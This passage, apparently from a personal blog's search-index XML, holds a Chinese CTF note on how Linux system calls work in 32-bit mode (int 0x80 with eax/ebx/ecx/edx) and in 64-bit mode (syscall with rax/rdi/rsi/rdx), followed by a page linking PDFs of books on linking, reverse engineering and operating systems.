<h2 id="Linux下的系统调用"><a href="#Linux下的系统调用" class="headerlink" title="Linux下的系统调用"></a>Linux下的系统调用</h2><p>系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。</p>
<p>系统不同模式下的系统调用的方式不同:</p>
<p>32位模式下，系统调用通过<code>int 0x80</code>执行中断类型码为128(0x80)的中断处理程序。<code>int</code>指令是汇编中的中断操作，而128对应的中断处理程序为：中断将指定程序传送给正在处理该中断的人，通过检查寄存器<code>eax</code>中的值，通知内核程序想要进行的系统调用，这个值称之为系统调用号。</p>
<p>64位模式下，系统调用通过<code>syscall</code>执行。<code>syscall</code>是由内核提供的用户空间与内核空间进行交互的一套标准API，这些API能够让用户受限的访问硬件设备。其运作原理与<code>int 0x80</code>类似，也是通过检测<code>rax</code>中的值来执行指定系统调用。</p>
<p>由于本人水平有限，不宜在此处多讲，免得误人子弟。但如果仅是为了做CTF中的题目，那么我们只需要知道不同模式下系统调用的方式即可。</p>
<h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p>传参方式：系统调用的参数存储在<code>ebx</code>,<code>ecx</code>,<code>edx</code>中，返回值存在eax寄存器</p>
<p>系统调用号：将系统调用号存入eax</p>
<p>调用方式：使用<code>int 0x80</code>中断调用使系统进入内核态，执行系统调用</p>
<p>具体包括系统调用号可以看这篇<a href="https://blog.csdn.net/xiaominthere/article/details/17287965">文章</a>。</p>
<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><p>传参方式：参数依次存入<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中，返回值存在rax寄存器</p>
<p>系统调用号：系统调用号传入<code>rax</code></p>
<p>调用方式：使用<code>syscall</code>进行系统调用</p>
<p>若将系统调用号看作参数，实际上可以将64位的系统调用看作<code>syscall([rax],[rdi],[rsi],[rdx])</code></p>
<p>系统调用号可以看这篇<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">文章</a>。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>books</title>
    <url>/b00ks/index.html</url>
    <content><![CDATA[<p><a href="./%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E2%80%94%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93.pdf">程序员的自我修养—链接、装载与库</a></p>
<p><a href="./C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98.pdf">C++反汇编与逆向分析技术揭秘</a></p>
<p><a href="./Windows%20PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%20%E6%88%9A%E5%88%A9.pdf">Windows PE权威指南</a></p>
<p><a href="./%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%20%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81_%E5%AE%8C%E6%95%B4%E7%89%88PDF%E9%AB%98%E6%B8%85%E7%89%88.pdf">漏洞战争 软件漏洞分析精要</a></p>
<p><a href="./%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80(%E7%AC%AC3%E7%89%88)%20%E3%80%8B%E7%8E%8B%E7%88%BD%E8%91%97.pdf">汇编语言(第3版)</a></p>
<p><a href="./%5B%E5%9B%BE%E7%81%B5%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%9B%E4%B9%A6%5D.%E7%A8%8B%E5%BA%8F%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84.pdf">程序是怎样跑起来的</a></p>
<p><a href="./%E9%93%BE%E6%8E%A5%E5%99%A8%E5%92%8C%E5%8A%A0%E8%BD%BD%E5%99%A8.pdf">链接器和加载器</a></p>
<p><a href="./%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F.pdf">深入理解计算机系统</a></p>
<p><a href="./%E7%BC%96%E7%A0%81%E2%80%94%E2%80%94%E9%9A%90%E5%8C%BF%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E7%A1%AC%E4%BB%B6%E8%83%8C%E5%90%8E%E7%9A%84%E8%AF%AD%E8%A8%80%E4%B8%8A.pdf">编码——隐匿在计算机软硬件背后的语言上</a></p>
<p><a href="./%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E4%B8%8E%E8%AE%BE%E8%AE%A1%20%E5%8E%9F%E4%B9%A6%E7%AC%AC5%E7%89%88.pdf">分布式系统概念与设计</a></p>
<p><a href="./Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.pdf">Linux内核设计与实现</a></p>
<p><a href="./WINDOWS%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0.pdf">WINDOWS内核原理与实现</a></p>
]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
